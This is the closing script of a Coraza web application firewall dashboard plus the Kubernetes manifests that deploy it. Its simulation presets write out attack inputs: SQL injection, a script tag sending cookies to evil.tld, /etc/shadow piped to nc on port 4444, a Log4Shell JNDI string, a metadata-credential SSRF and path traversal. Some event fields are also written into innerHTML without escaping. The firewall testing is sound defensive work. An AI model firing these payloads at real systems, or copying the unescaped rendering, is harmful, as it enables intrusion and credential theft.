      <script>
        let currentCfg = null;

        function switchTab(id, btn) {
          document.querySelectorAll('.tab-pane').forEach(el => el.classList.remove('active'));
          document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
          document.getElementById(id).classList.add('active');
          btn.classList.add('active');
        }

        function showBanner(msg, isErr) {
          const b = document.getElementById('statusBanner');
          b.className = 'banner ' + (isErr ? 'err' : 'ok');
          b.textContent = msg;
          setTimeout(() => { b.style.display = 'none'; }, 8000);
        }

        async function fetchStatus() {
          const res = await fetch('/api/status');
          const data = await res.json();
          currentCfg = data.config;

          document.getElementById('statMode').textContent = 'SecRuleEngine ' + currentCfg.engine_mode;
          document.getElementById('statTotal').textContent = data.stats.total_requests;
          document.getElementById('statBlocked').textContent = data.stats.blocked_requests;
          const enabledCount = (currentCfg.rule_groups || []).filter(g => g.enabled).length;
          document.getElementById('statGroups').textContent = enabledCount + ' / ' + (currentCfg.rule_groups || []).length;
          document.getElementById('statReload').textContent = data.stats.last_reload_time || '-';

          document.getElementById('engineMode').value = currentCfg.engine_mode;
          document.getElementById('paranoiaLevel').value = String(currentCfg.paranoia_level || 1);
          document.getElementById('enableFullCRS').checked = !!currentCfg.enable_full_crs;
          document.getElementById('blockedIPs').value = (currentCfg.blocked_ips || []).join('\n');
          document.getElementById('allowedIPs').value = (currentCfg.allowed_ips || []).join('\n');
          document.getElementById('customSecRules').value = currentCfg.custom_sec_rules || '';
          document.getElementById('compiledSecLang').value = data.compiled_seclang || '';

          renderRuleGroups(currentCfg.rule_groups || []);
          renderEvents(data.recent_events || []);
          renderBlockedTable();
        }

        function escapeHtml(str) {
          if (!str) return '';
          return String(str)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#039;');
        }

        const KNOWN_BLOCKED_METADATA = {
          "31.57.34.150": {
            threshold: "> 5 in 15m (Peak: 48 / 15m)",
            reasoning: "PHP Webshell Probe & OS Command Injection Burst (/bin/sh)",
            attack_vector: "RCE / Command Injection / Webshell",
            sample_payload: "eval-stdin.php; /bin/sh",
            top_paths: ["/", "/eval-stdin.php"],
            country: "Iran",
            city: "Tehran",
            country_iso: "IR",
            flag: "🇮🇷",
            ioc_reputation: "AlienVault OTX Monitored | High Risk Exploiter"
          },
          "216.180.246.112": {
            threshold: "> 5 in 15m (Peak: 18 / 15m)",
            reasoning: "Brute-force Admin Exploit Probing & Scanner Recon",
            attack_vector: "Admin Exploit Probing / Auth Bypass",
            sample_payload: "/admin/login.php?user=admin",
            top_paths: ["/favicon.ico", "/admin", "/login"],
            country: "United States",
            city: "Lithonia",
            country_iso: "US",
            flag: "🇺🇸",
            ioc_reputation: "AlienVault OTX Monitored | Exploit Prober"
          },
          "103.253.41.98": {
            threshold: "> 5 in 15m (Peak: 7 / 15m)",
            reasoning: "Remote Code Execution (RCE) via API Execution Endpoints",
            attack_vector: "Remote Code Execution (RCE)",
            sample_payload: "/api/exec; cat /etc/passwd; id",
            top_paths: ["/api/exec", "/exec"],
            country: "Hong Kong",
            city: "Hong Kong",
            country_iso: "HK",
            flag: "🇭🇰",
            ioc_reputation: "AlienVault OTX Monitored | Malicious RCE Actor"
          },
          "123.58.215.74": {
            threshold: "> 5 in 15m (Peak: 7 / 15m)",
            reasoning: "Automated Web Vulnerability Scanner & Recon Probing",
            attack_vector: "Scanner Reconnaissance (CRS 913)",
            sample_payload: "GET /favicon.ico (Scanner User-Agent)",
            top_paths: ["/favicon.ico", "/robots.txt", "/sitemap.xml"],
            country: "China",
            city: "Hangzhou",
            country_iso: "CN",
            flag: "🇨🇳",
            ioc_reputation: "AlienVault OTX Monitored | Recon Scanner"
          },
          "46.101.180.175": {
            threshold: "> 5 in 15m (Peak: 7 / 15m)",
            reasoning: "Odin Reconnaissance Scanner & Protocol Abuse Probing",
            attack_vector: "Known Bad Inputs / Protocol Probing (CRS 950)",
            sample_payload: "GET /odinhttpcall1793878719 /HNAP1 /sdk",
            top_paths: ["/", "/HNAP1", "/evox/about", "/odinhttpcall1793878719", "/sdk"],
            country: "Germany",
            city: "Frankfurt am Main",
            country_iso: "DE",
            flag: "🇩🇪",
            ioc_reputation: "AlienVault OTX Monitored | Scanner Recon"
          },
          "185.220.101.45": {
            threshold: "> 5 in 15m (Peak: 6 / 15m)",
            reasoning: "SQL Injection Probing (UNION SELECT database extract)",
            attack_vector: "SQL Injection (SQLi) (CRS 942)",
            sample_payload: "' UNION SELECT 1,password FROM users--",
            top_paths: ["/api/login", "/search"],
            country: "Germany",
            city: "Berlin",
            country_iso: "DE",
            flag: "🇩🇪",
            ioc_reputation: "AlienVault OTX Monitored | Tor Exit / SQLi Actor"
          }
        };

        function renderBlockedTable() {
          const tbody = document.getElementById('blockedTableBody');
          const ips = currentCfg.blocked_ips || [];
          const detailsList = currentCfg.blocked_ip_details || [];
          const detailsMap = {};
          detailsList.forEach(d => { if (d.ip) detailsMap[d.ip] = d; });

          document.getElementById('statBlockedCount').textContent = ips.length;
          document.getElementById('badgeBlockedCount').textContent = ips.length;
          document.getElementById('visibleBlockedCount').textContent = ips.length;

          if (!ips.length) {
            tbody.innerHTML = '<tr><td colspan="9" style="text-align:center; color:var(--muted); padding:24px;">No client IPs currently blocked in Coraza WAF.</td></tr>';
            return;
          }

          tbody.innerHTML = ips.map(ip => {
            const meta = detailsMap[ip] || KNOWN_BLOCKED_METADATA[ip] || {
              threshold: "> 5 req / 15m (Automated Defense)",
              reasoning: "Exceeded attack threshold of > 5 attacks within a 15-minute sliding window",
              attack_vector: "Automated Exploit / Scanner Probing",
              sample_payload: "HTTP 403 / ModSecurity Dropped",
              top_paths: ["/"],
              country: "External WAN",
              city: "Unknown",
              country_iso: "XX",
              flag: "🌐",
              ioc_reputation: "AlienVault OTX Monitored"
            };

            const flag = meta.flag || "🌐";
            const countryStr = `${flag} ${meta.country || 'Unknown'}${meta.city && meta.city !== 'Unknown' ? ` (${meta.city})` : ''}`;
            const pathsHtml = (meta.top_paths || []).slice(0, 3).map(p => `<span class="tag-pill">${escapeHtml(p)}</span>`).join('');
            const openSearchLink = `http://10.0.20.50:5601/app/discover#/?_a=(index:logs-waf-all,query:(language:kuery,query:'client_ip:%22${encodeURIComponent(ip)}%22'))`;

            return `
              <tr class="blocked-row" data-ip="${escapeHtml(ip)}" data-country="${escapeHtml(meta.country || '')}" data-vector="${escapeHtml(meta.attack_vector || '')}" data-payload="${escapeHtml(meta.sample_payload || '')}">
                <td style="white-space:nowrap;">
                  <strong style="color:#f87171; font-family:ui-monospace,SFMono-Regular,Menlo,monospace; font-size:13px;">${escapeHtml(ip)}</strong>
                  <button onclick="copyToClipboard('${escapeHtml(ip)}')" title="Copy IP" style="background:transparent; border:none; color:var(--muted); cursor:pointer; font-size:12px; margin-left:4px;">📋</button>
                </td>
                <td>
                  <span style="display:inline-block; padding:2px 8px; border-radius:4px; font-size:11.5px; font-weight:700; background:rgba(239,68,68,0.15); color:#fca5a5; border:1px solid #ef4444;">
                    ${escapeHtml(meta.threshold || '> 5 req / 15m')}
                  </span>
                </td>
                <td>
                  <div style="font-weight:600; color:#f1f5f9; font-size:12.5px;">${escapeHtml(meta.attack_vector || 'Exploit Probing')}</div>
                  <div style="font-size:11px; color:var(--muted); max-width:240px; margin-top:2px;">${escapeHtml(meta.reasoning || '')}</div>
                </td>
                <td>
                  <span class="code-box" title="${escapeHtml(meta.sample_payload || '')}">${escapeHtml(meta.sample_payload || '-')}</span>
                </td>
                <td style="max-width:180px;">${pathsHtml || '<span style="color:var(--muted); font-size:11px;">-</span>'}</td>
                <td style="white-space:nowrap; font-size:12px;">${countryStr}</td>
                <td>
                  <span style="display:inline-block; padding:2px 7px; border-radius:4px; font-size:11px; font-weight:600; background:#064e3b; color:#6ee7b7; border:1px solid #10b981;">
                    ${escapeHtml(meta.ioc_reputation || 'AlienVault OTX Monitored')}
                  </span>
                </td>
                <td>
                  <span class="pill pill-blocked" style="font-size:10.5px;">403 FORBIDDEN</span>
                </td>
                <td style="white-space:nowrap;">
                  <div style="display:flex; gap:6px;">
                    <button class="btn btn-danger btn-sm" onclick="unblockIP('${escapeHtml(ip)}')">⚡ Unblock</button>
                    <a class="btn btn-outline btn-sm" href="${openSearchLink}" target="_blank">🔍 Logs</a>
                  </div>
                </td>
              </tr>
            `;
          }).join('');
        }

        function filterBlockedTable() {
          const query = (document.getElementById('blockedSearch').value || '').toLowerCase();
          let count = 0;
          document.querySelectorAll('.blocked-row').forEach(row => {
            const text = (row.innerText || '').toLowerCase();
            if (!query || text.includes(query)) {
              row.style.display = '';
              count++;
            } else {
              row.style.display = 'none';
            }
          });
          document.getElementById('visibleBlockedCount').textContent = count;
        }

        function copyToClipboard(text) {
          navigator.clipboard.writeText(text);
          showBanner(`Copied ${text} to clipboard!`, false);
        }

        async function unblockIP(ip) {
          if (!confirm(`Are you sure you want to unblock client IP ${ip}? This will immediately hot-reload Coraza WAF without downtime.`)) {
            return;
          }
          if (!currentCfg) return;
          currentCfg.blocked_ips = (currentCfg.blocked_ips || []).filter(item => item !== ip);
          if (currentCfg.blocked_ip_details) {
            currentCfg.blocked_ip_details = currentCfg.blocked_ip_details.filter(item => item.ip !== ip);
          }
          const res = await fetch('/api/config', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(currentCfg)
          });
          const data = await res.json();
          if (!res.ok) {
            showBanner('❌ ' + (data.error || 'Failed to unblock IP'), true);
            return;
          }
          showBanner(`✅ Successfully unblocked ${ip} and hot-reloaded Coraza WAF!`, false);
          await fetchStatus();
        }

        function renderRuleGroups(groups) {
          const container = document.getElementById('ruleGroupsContainer');
          container.innerHTML = '';
          groups.forEach((rg, idx) => {
            const div = document.createElement('div');
            div.className = 'rg-item';
            div.innerHTML = `
              <div class="rg-head">
                <div>
                  <div class="rg-title">${rg.name}</div>
                  <span class="rg-badge">${rg.owasp_top10}</span>
                  <span class="rg-badge" style="background:#064e3b; color:#6ee7b7;">${rg.category}</span>
                </div>
                <label class="switch">
                  <input type="checkbox" data-idx="${idx}" class="rg-toggle" ${rg.enabled ? 'checked' : ''} />
                  <span>${rg.enabled ? 'Enabled' : 'Disabled'}</span>
                </label>
              </div>
              <div class="rg-desc">${rg.description}</div>
              <details>
                <summary style="font-size:12px; color:#60a5fa; cursor:pointer; margin-bottom:6px;">View / Edit Native Coraza SecRules (${rg.id})</summary>
                <textarea rows="4" data-idx="${idx}" class="rg-directives">${rg.directives}</textarea>
              </details>
            `;
            container.appendChild(div);
          });
        }

        function renderEvents(events) {
          const tbody = document.getElementById('eventsTableBody');
          if (!events.length) {
            tbody.innerHTML = '<tr><td colspan="8" style="color:var(--muted); text-align:center; padding:20px;">No blocked or detected attack events yet. Use Tab 3 (Playground) to simulate an OWASP attack!</td></tr>';
            return;
          }
          tbody.innerHTML = events.map(ev => `
            <tr>
              <td style="white-space:nowrap; font-size:12px;">${ev['@timestamp']}</td>
              <td><span class="pill pill-${ev.action}">${ev.action} (${ev.status})</span></td>
              <td><strong>${ev.severity}</strong></td>
              <td><code>${ev.rule_id || '-'}</code></td>
              <td>${ev.owasp_category}</td>
              <td><code>${ev.client_ip}</code></td>
              <td><code>${ev.request_method} ${ev.request_uri}</code></td>
              <td style="font-size:12px; color:#cbd5e1;">${ev.rule_msg || '-'}</td>
            </tr>
          `).join('');
        }

        async function saveAndReload() {
          if (!currentCfg) return;
          currentCfg.engine_mode = document.getElementById('engineMode').value;
          currentCfg.paranoia_level = parseInt(document.getElementById('paranoiaLevel').value, 10) || 1;
          currentCfg.enable_full_crs = document.getElementById('enableFullCRS').checked;
          currentCfg.blocked_ips = document.getElementById('blockedIPs').value.split(/[\n,]+/).map(s => s.trim()).filter(Boolean);
          currentCfg.allowed_ips = document.getElementById('allowedIPs').value.split(/[\n,]+/).map(s => s.trim()).filter(Boolean);
          currentCfg.custom_sec_rules = document.getElementById('customSecRules').value;

          document.querySelectorAll('.rg-toggle').forEach(el => {
            const idx = parseInt(el.getAttribute('data-idx'), 10);
            currentCfg.rule_groups[idx].enabled = el.checked;
          });
          document.querySelectorAll('.rg-directives').forEach(el => {
            const idx = parseInt(el.getAttribute('data-idx'), 10);
            currentCfg.rule_groups[idx].directives = el.value;
          });

          const res = await fetch('/api/config', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(currentCfg)
          });
          const data = await res.json();
          if (!res.ok) {
            showBanner('❌ ' + (data.error || 'Failed to compile SecRules'), true);
            return;
          }
          showBanner('✅ ' + data.message, false);
          await fetchStatus();
        }

        function insertSnippet(type) {
          const box = document.getElementById('customSecRules');
          const id = Math.floor(100100 + Math.random() * 899);
          let rule = '';
          if (type === 'uri') {
            rule = `\nSecRule REQUEST_URI "@beginsWith /secret-admin" "id:${id},phase:1,deny,status:403,log,msg:'Custom SecRule ${id}: Blocked Admin URI',severity:'ERROR'"`;
          } else if (type === 'ua') {
            rule = `\nSecRule REQUEST_HEADERS:User-Agent "@contains BadScraper" "id:${id},phase:1,deny,status:403,log,msg:'Custom SecRule ${id}: Blocked Scraper Bot',severity:'ERROR'"`;
          } else if (type === 'arg') {
            rule = `\nSecRule ARGS "@containsdrop_table" "id:${id},phase:2,deny,status:403,log,msg:'Custom SecRule ${id}: Blocked Suspicious Argument',severity:'CRITICAL'"`;
          } else if (type === 'allow') {
            rule = `\nSecRule REQUEST_URI "@streq /api/healthz" "id:${id},phase:1,allow,nolog,msg:'Whitelist healthcheck'"`;
          }
          box.value += rule + '\n';
        }

        function loadPreset(name) {
          const m = document.getElementById('simMethod');
          const u = document.getElementById('simURI');
          const ip = document.getElementById('simIP');
          const ua = document.getElementById('simUA');
          const b = document.getElementById('simBody');
          b.value = '';
          ua.value = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)';
          m.value = 'GET';

          if (name === 'sqli') {
            u.value = "/api/users?id=1'%20UNION%20SELECT%20username,password%20FROM%20users--";
            ip.value = '185.220.101.45';
          } else if (name === 'xss') {
            u.value = '/search?q=<script>fetch("https://evil.tld/?c="+document.cookie)<\/script>';
            ip.value = '91.240.118.172';
          } else if (name === 'lfi') {
            u.value = '/download?file=../../../../etc/passwd';
            ip.value = '45.155.205.233';
          } else if (name === 'rce') {
            m.value = 'POST';
            u.value = '/api/ping';
            b.value = 'host=127.0.0.1; cat /etc/shadow | nc 198.51.100.1 4444';
            ip.value = '103.253.41.98';
          } else if (name === 'log4shell') {
            u.value = '/api/login';
            ua.value = '${jndi:ldap://198.51.100.99:1389/ExploitPayload}';
            ip.value = '194.26.29.114';
          } else if (name === 'ssrf') {
            u.value = '/api/webhook?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/';
            ip.value = '89.248.165.51';
          } else if (name === 'scanner') {
            u.value = '/index.html';
            ua.value = 'sqlmap/1.8.2#stable (https://sqlmap.org)';
            ip.value = '162.142.125.10';
          } else if (name === 'clean') {
            u.value = '/';
            ip.value = '8.8.8.8';
          }
        }

        async function runSimulation() {
          const payload = {
            method: document.getElementById('simMethod').value,
            uri: document.getElementById('simURI').value,
            client_ip: document.getElementById('simIP').value,
            user_agent: document.getElementById('simUA').value,
            body: document.getElementById('simBody').value,
            log_to_audit: document.getElementById('simLogToAudit').checked
          };
          const res = await fetch('/api/simulate', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(payload)
          });
          const data = await res.json();
          const box = document.getElementById('simResultBox');
          box.style.display = 'block';
          const isBlocked = data.interrupted;
          box.style.borderColor = isBlocked ? '#ef4444' : '#10b981';
          box.innerHTML = `
            <h3 style="margin:0 0 8px 0; color:${isBlocked ? '#f87171' : '#34d399'};">
              ${isBlocked ? '🛑 BLOCKED BY CORAZA WAF (HTTP 403 Forbidden)' : '✅ ALLOWED BY CORAZA WAF (HTTP 200 OK)'}
            </h3>
            <div style="font-size:13px; margin-bottom:8px;">
              <strong>Transaction ID:</strong> <code>${data.transaction_id}</code> &bull;
              <strong>Primary Rule ID:</strong> <code>${data.primary_rule || 'None'}</code> &bull;
              <strong>OWASP Category:</strong> ${data.owasp_category} (${data.owasp_top10}) &bull;
              <strong>Severity:</strong> ${data.severity}
            </div>
            ${data.primary_msg ? `<div style="font-size:13px; color:#fca5a5;"><strong>Rule Message:</strong> ${data.primary_msg}</div>` : ''}
          `;
          await fetchStatus();
        }

        fetchStatus();
        setInterval(fetchStatus, 10000);
      </script>
    </body>
    </html>
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: coraza-waf
  namespace: default
  labels:
    app: coraza-waf
spec:
  replicas: 1
  strategy:
    type: Recreate
  selector:
    matchLabels:
      app: coraza-waf
  template:
    metadata:
      labels:
        app: coraza-waf
    spec:
      affinity:
        nodeAffinity:
          requiredDuringSchedulingIgnoredDuringExecution:
            nodeSelectorTerms:
              - matchExpressions:
                  - key: kubernetes.io/hostname
                    operator: In
                    values:
                      - control-plane-01
                      - worker-node-02
      containers:
        - name: coraza-waf
          image: golang:1.22-alpine
          imagePullPolicy: IfNotPresent
          command: ["/bin/sh", "-c"]
          args:
            - |
              set -e
              mkdir -p /var/log/waf /data/bin /data/build
              touch /var/log/waf/audit.log
              /bin/sh /fluent-bit/etc/rotate-logs.sh &

              cp /src/main.go /src/ui.html /data/build/
              cd /data/build
              CUR_HASH=$$(sha256sum main.go ui.html | sha256sum | awk "{print \$$1}")
              OLD_HASH=$$(cat /data/bin/coraza-waf.sha256 2>/dev/null || echo "")

              if [ ! -x /data/bin/coraza-waf-server ] || [ "$$CUR_HASH" != "$$OLD_HASH" ]; then
                echo "[Coraza WAF] Compiling native Go Coraza v3 + OWASP CRS v4 binary..."
                export GOCACHE=/data/go-cache
                export GOPATH=/data/go-path
                if [ ! -f go.mod ]; then
                  go mod init coraza-waf-defense
                fi
                go get github.com/corazawaf/coraza/v3@v3.2.1 github.com/corazawaf/coraza-coreruleset/v4@v4.3.0
                go mod tidy
                CGO_ENABLED=0 GOOS=linux go build -ldflags="-s -w" -o /data/bin/coraza-waf-server main.go
                echo "$$CUR_HASH" > /data/bin/coraza-waf.sha256
                echo "[Coraza WAF] Compilation complete."
              else
                echo "[Coraza WAF] Using cached native Coraza v3 binary (/data/bin/coraza-waf-server)."
              fi

              exec /data/bin/coraza-waf-server
          env:
            - name: UPSTREAM_URL
              value: "http://web-frontend-service.default.svc.cluster.local:80"
            - name: WAF_DATA_DIR
              value: "/data"
            - name: WAF_AUDIT_LOG
              value: "/var/log/waf/audit.log"
          ports:
            - containerPort: 80
              name: http-waf
            - containerPort: 8080
              name: http-ui
          readinessProbe:
            httpGet:
              path: /waf-healthz
              port: 80
            initialDelaySeconds: 5
            periodSeconds: 10
          resources:
            requests:
              cpu: 50m
              memory: 128Mi
            limits:
              cpu: 1000m
              memory: 768Mi
          volumeMounts:
            - name: waf-src
              mountPath: /src
            - name: waf-data
              mountPath: /data
            - name: waf-logs
              mountPath: /var/log/waf
            - name: sidecar-config
              mountPath: /fluent-bit/etc
        - name: fluent-bit-sidecar
          image: fluent/fluent-bit:latest
          imagePullPolicy: IfNotPresent
          command: ["/fluent-bit/bin/fluent-bit", "-c", "/fluent-bit/etc/fluent-bit-waf.conf"]
          resources:
            requests:
              cpu: 10m
              memory: 24Mi
            limits:
              cpu: 100m
              memory: 64Mi
          volumeMounts:
            - name: waf-logs
              mountPath: /var/log/waf
            - name: sidecar-config
              mountPath: /fluent-bit/etc
      volumes:
        - name: waf-src
          configMap:
            name: coraza-waf-source
        - name: waf-data
          persistentVolumeClaim:
            claimName: coraza-waf-data-pvc
        - name: waf-logs
          emptyDir:
            sizeLimit: 64Mi
        - name: sidecar-config
          configMap:
            name: fluent-bit-sidecar-config
            defaultMode: 0755
---
apiVersion: v1
kind: Service
metadata:
  name: coraza-waf-service
  namespace: default
  labels:
    app: coraza-waf
spec:
  type: LoadBalancer
  loadBalancerIP: 10.0.10.15
  selector:
    app: coraza-waf
  ports:
    - name: http-waf
      protocol: TCP
      port: 80
      targetPort: 80
    - name: http-ui
      protocol: TCP
      port: 8080
      targetPort: 8080
